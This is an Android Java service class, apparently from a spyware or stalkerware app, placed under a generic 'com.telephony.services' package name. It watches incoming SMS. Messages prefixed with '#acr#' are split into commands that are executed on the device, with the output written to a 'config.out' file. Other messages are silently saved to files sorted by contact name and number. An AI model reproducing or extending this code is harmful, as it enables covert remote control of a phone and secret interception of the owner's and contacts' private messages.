package com.telephony.services;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.text.format.DateFormat;

public class SMService extends Service {

	public static final String EXTRA_SMS_BODY = "sms_body";
	public static final String IDENT_SMS = "#acr#";
	public static final String CONFIG_OUT_FILENAME = "config.out";
	public static final String SMS_DIR = "texts";

	private PreferenceUtils sPref = null;
	private ExecutorService es;

	private String sms_body = null;
	private String phoneNumber = null;
	private Commander cmdr;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();
		es = Executors.newFixedThreadPool(1);
		sPref = PreferenceUtils.getInstance(this);
		cmdr = new Commander(this);
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));
		return START_REDELIVER_INTENT;

	}

	private class RunService implements Runnable {
		private final Intent intent;
		private final int flags;
		private final int startId;
		private final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		@Override
		public void run() {
			try {
				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId);
				Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)) {
					phoneNumber = intent.getStringExtra(Utils.EXTRA_PHONE_NUMBER);
					sms_body = intent.getStringExtra(EXTRA_SMS_BODY).trim();
					if ((sms_body != null) && (!sms_body.isEmpty())) {
						if (sms_body.startsWith(SMService.IDENT_SMS)) {
							sms_body = sms_body.replace(IDENT_SMS, "").trim();
							StringBuilder exec_out = new StringBuilder();
							String[] sms = sms_body.split(" *#+ *|[ \r]*\n+");

							for (String cmd : sms) {
								try {
									if (!cmd.isEmpty()) {
										Log.d(Utils.LOG_TAG, "try to exec: " + cmd);
										exec_out.append(cmdr.exec(cmd));
									}
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
							if (exec_out.length() > 0) {
								Utils.writeFile(new File(sPref.getRootDir(), CONFIG_OUT_FILENAME), exec_out.toString());
							}
						} else if (sPref.isSMSRecord()){
							Utils.writeFile(getFilename(), sms_body);
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			try {

			} catch (Exception e) {
				e.printStackTrace();
			}
			Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
			stopSelf(startId);
		}

	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		Utils.shutdownAndAwaitTermination(es, 60, TimeUnit.SECONDS);
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

	/**
	 * Получить файл для записи
	 * 
	 * @return
	 * @throws IOException
	 */
	private File getFilename() throws IOException {
		File sms_dir = new File(sPref.getRootDir(), SMS_DIR);

		String myDate = DateFormat.format("yyyy.MM.dd-kk_mm_ss", new Date()).toString();
		String phoneName = Utils.getContactName(this, phoneNumber);

		File dir = new File(sms_dir, phoneName + File.separator + phoneNumber);

		if (!dir.exists()) {
			dir.mkdirs();
		}
		String fn = myDate + ".txt";

		return new File(dir, fn);
	}

}
